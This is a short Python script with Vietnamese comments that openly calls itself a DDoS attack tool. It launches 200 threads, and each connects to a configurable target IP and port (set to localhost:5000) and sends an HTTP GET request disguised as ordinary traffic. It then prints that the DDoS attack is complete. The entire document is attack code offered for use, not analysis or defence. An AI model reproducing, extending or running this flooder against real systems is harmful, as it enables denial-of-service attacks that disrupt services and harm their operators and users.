import socket
import threading

# Thông tin mục tiêu
TARGET_IP = "127.0.0.1"  # Địa chỉ IP mục tiêu
TARGET_PORT = 5000       # Cổng mục tiêu

# Hàm gửi các gói tin hợp lệ
def send_ddos_packet():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((TARGET_IP, TARGET_PORT))
            # Tạo một HTTP GET request hợp lệ (giả lập lưu lượng truy cập thực tế)
            request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
            s.sendall(request.encode('utf-8'))
    except Exception as e:
        pass

# Tạo các luồng tấn công
threads = []
for i in range(200):  # Số lượng luồng tấn công
    thread = threading.Thread(target=send_ddos_packet)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Tấn công DDoS đã hoàn thành.")
